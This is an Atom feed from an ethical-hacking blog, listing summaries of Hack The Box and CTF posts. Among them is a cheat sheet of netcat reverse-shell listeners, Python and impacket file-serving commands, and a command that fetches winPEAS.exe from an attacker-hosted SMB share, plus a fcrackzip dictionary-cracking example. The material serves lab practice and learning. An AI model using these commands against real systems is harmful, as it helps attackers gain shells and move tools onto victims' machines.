<feed xmlns="http://www.w3.org/2005/Atom"> <id>https://naosinfosec.com/</id><title>NaosInfoSec</title><subtitle>Ethical hacking blog and technical documentation.</subtitle> <updated>2023-03-25T12:10:07+01:00</updated> <author> <name>Rai Abril</name> <uri>https://naosinfosec.com/</uri> </author><link rel="self" type="application/atom+xml" href="https://naosinfosec.com/feed.xml"/><link rel="alternate" type="text/html" hreflang="en" href="https://naosinfosec.com/"/> <generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator> <rights> © 2023 Rai Abril </rights> <icon>/assets/img/favicons/favicon.ico</icon> <logo>/assets/img/favicons/favicon-96x96.png</logo> <entry><title>Useful commands</title><link href="https://naosinfosec.com/posts/useful-commands/" rel="alternate" type="text/html" title="Useful commands" /><published>2023-03-24T13:55:00+01:00</published> <updated>2023-03-25T12:10:31+01:00</updated> <id>https://naosinfosec.com/posts/useful-commands/</id> <content src="https://naosinfosec.com/posts/useful-commands/" /> <author> <name>Rai Abril</name> </author> <category term="HTB" /> <summary> Start listener For Linux sudo nc -nvlp 4444 For Windows sudo rlwrap nc -nvlp 443 Web service sudo python3 -m http.server 80 SMB service with python impacket sudo smbserver.py share . -smb2support Get resource from service SMB copy \\&amp;lt;local_ip&amp;gt;\share\winPEAS.exe . </summary> </entry> <entry><title>HTB Squashed</title><link href="https://naosinfosec.com/posts/htb-Squashed/" rel="alternate" type="text/html" title="HTB Squashed" /><published>2023-03-05T15:22:00+01:00</published> <updated>2023-03-05T15:22:00+01:00</updated> <id>https://naosinfosec.com/posts/htb-Squashed/</id> <content src="https://naosinfosec.com/posts/htb-Squashed/" /> <author> <name>Rai Abril</name> </author> <category term="HTB" /> <category term="Easy" /> <summary> Reconnaissance/Intelligence Gathering In this step we collect the target information available in public repositories or sources. We do everything passively. Scanning and enumeration Now it’s time to start the active scanning. As always, we define our TARGET and hosts file of our machine to facilitate the process. TARGET=10.10.11.191 echo "10.10.11.191 squashed.htb" | sudo tee -a /etc/ho... </summary> </entry> <entry><title>fcrackzip</title><link href="https://naosinfosec.com/posts/fcrackzip/" rel="alternate" type="text/html" title="fcrackzip" /><published>2022-10-29T14:55:00+02:00</published> <updated>2022-10-29T14:55:00+02:00</updated> <id>https://naosinfosec.com/posts/fcrackzip/</id> <content src="https://naosinfosec.com/posts/fcrackzip/" /> <author> <name>Rai Abril</name> </author> <category term="Tools" /> <summary> fcrackzip is a very nice tool to crack password protected files using dictionaries and brute force. To install we just need to run apt (for Ubuntu/Debian). $ sudo apt install fcrackzip To test how it works let’s create a zip file with our flag. $ sudo zip --password abc123 file.zip Desktop/user.txt Then, let’s try to break it up using a dictionary. $ fcrackzip -D -p /usr/share/john/passwor... </summary> </entry> <entry><title>Tools for eth hacking</title><link href="https://naosinfosec.com/posts/tools/" rel="alternate" type="text/html" title="Tools for eth hacking" /><published>2022-10-16T11:52:00+02:00</published> <updated>2022-10-16T11:52:00+02:00</updated> <id>https://naosinfosec.com/posts/tools/</id> <content src="https://naosinfosec.com/posts/tools/" /> <author> <name>Rai Abril</name> </author> <category term="Linux" /> <summary> Here you can find a list of essentials tools for ethical hacking and CTFs. Git git-dumper Python uncompyle6 Javascript jsfuck Decoder-JSFuck Data conversion and languages cyberchef brainfuck Stego stegsolve steghide jsteg jstego exiftool Good list by John Hammond </summary> </entry> <entry><title>Decompile Python with Uncompyle6</title><link href="https://naosinfosec.com/posts/uncompyle6/" rel="alternate" type="text/html" title="Decompile Python with Uncompyle6" /><published>2022-10-16T11:12:00+02:00</published> <updated>2022-10-16T11:12:00+02:00</updated> <id>https://naosinfosec.com/posts/uncompyle6/</id> <content src="https://naosinfosec.com/posts/uncompyle6/" /> <author> <name>Rai Abril</name> </author> <category term="Linux" /> <summary> uncompyle6 translates Python bytecode back into equivalent Python source code. It enables the possibility to create .py files using the compiled version .pyc. Install uncompyle6 It can be installed with your package manager. sudo pip install uncompyle6 Decompile file We just need to run the package to see it in action. uncompyle6 get_flag.cpython-38.pyc -o get_flag.py </summary> </entry> </feed>
